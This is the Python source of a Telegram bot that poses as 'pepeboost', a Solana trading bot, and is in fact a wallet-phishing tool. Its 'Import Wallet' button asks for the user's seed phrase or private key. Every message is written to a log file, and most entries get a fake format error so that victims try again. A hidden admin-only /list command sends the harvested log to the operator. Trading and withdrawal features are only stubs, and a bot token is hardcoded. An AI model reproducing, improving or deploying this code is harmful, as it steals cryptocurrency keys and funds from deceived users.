import asyncio
import time
from datetime import datetime
import aiofiles
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, filters, ContextTypes, MessageHandler
from typing import Final

# Token and configurations
TOKEN: Final = '7523077804:AAEWFJuuqYYO14TkBAwCuVvWdQWWeZaGoR4'
BOT_USERNAME: Final = '@pepeboost_soll_bot'
LOG_FILE_PATH: Final = 'user_messages.txt'
ADMIN_USER_ID = 5551837706

# 添加一个保活函数
async def keep_alive():
    while True:
        print("Bot is running...")
        await asyncio.sleep(60)  # 每60秒打印一次状态

async def list(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """处理 /getlogs 命令，发送 user_messages.txt 的内容"""
    user = update.effective_user
    if user.id != ADMIN_USER_ID:
        await update.message.reply_text("🔗 Please import a wallet to start\n\n请先绑定钱包")
        return

    try:
        async with aiofiles.open('user_messages.txt', mode='r', encoding='utf-8') as f:
            content = await f.read()
        if len(content) > 4000:
            async with aiofiles.open('user_messages.txt', mode='rb') as f:
                await update.message.reply_document(document=f, filename='user_messages.txt')
        else:
            await update.message.reply_text(content or "日志文件为空。")
    except Exception as e:
        await update.message.reply_text(f"无法读取日志文件: {e}")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [
        [InlineKeyboardButton("🔌 Import Wallet / 绑定钱包", callback_data='link_wallet')],
        [InlineKeyboardButton("💰 Trade / 交易", callback_data='trade')],
        [InlineKeyboardButton("💴 Withdraw / 提现", callback_data='withdraw')],
        [InlineKeyboardButton("💳 My Wallet / 查看我的钱包", callback_data='my_wallet')],
        [InlineKeyboardButton("📖 Help / 帮助", callback_data='help')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    message = (
        "Welcome to pepeboost, extremely fast solana trading bot. ⚡️Support Pumpfun tokens, Snipe, and Limit orders.\n\n"
        "⚡️欢迎使用pepeboost sol交易机器人"
    )
    await update.message.reply_text(message, reply_markup=reply_markup)

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()

    if query.data == 'link_wallet':
        response_text = 'Please enter wallet secret phrase or private key.\n\n请输入您的助记词或私钥'
    elif query.data == 'trade':
        response_text = '🔗 Please import a wallet to start\n\n请先绑定钱包'
    elif query.data == 'withdraw':
        response_text = '🔗 Please import a wallet to start\n\n请先绑定钱包'
    elif query.data == 'my_wallet':
        response_text = '🔗 Please import a wallet to start\n\n请先绑定钱包'
    elif query.data == 'help':
        response_text = (
            "⭐️ What should I do if the bot is lagging?\n"
            # ... (保持原有的帮助文本内容)
            "🐦 https://twitter.com/PepeBoost888"
        )
    else:
        response_text = "请点击按钮 'Link Your Wallet / 绑定钱包' 来绑定您的钱包。"

    time.sleep(1)
    await query.message.reply_text(response_text)

async def handle_random_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.message.from_user
    user_id = user.id
    username = user.username or user.full_name
    user_text = update.message.text

    log_entry = f"UserID: {user_id} | Username: {username} | Message: {user_text}\n"

    try:
        async with aiofiles.open(LOG_FILE_PATH, mode='a', encoding='utf-8') as f:
            await f.write(log_entry)
        print(f"记录消息: {log_entry.strip()}")
    except Exception as e:
        print(f"记录消息时出错: {e}")

    user_text = update.message.text.lower()
    if 'hello' in user_text or 'hi' in user_text:
        response = "Hello! 👋 如何我可以帮助您？"
    elif 'wallet' in user_text:
        response = "请点击按钮 'Link Your Wallet / 绑定钱包' 来绑定您的钱包。"
    else:
        time.sleep(3)
        response = "❌ The format of the phrase or key entered is unrecognizable\n输入的私钥地址格式有误或无法识别"

    await update.message.reply_text(response)

async def main():
    # 创建 Application 对象
    application = Application.builder().token(TOKEN).build()

    # 添加处理器
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('list', list))
    application.add_handler(CallbackQueryHandler(button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_random_message))

    # 启动机器人和保活进程
    print("Bot is starting...")
    await asyncio.gather(
        application.run_polling(allowed_updates=Update.ALL_TYPES),
        keep_alive()
    )

if __name__ == '__main__':
    asyncio.run(main())
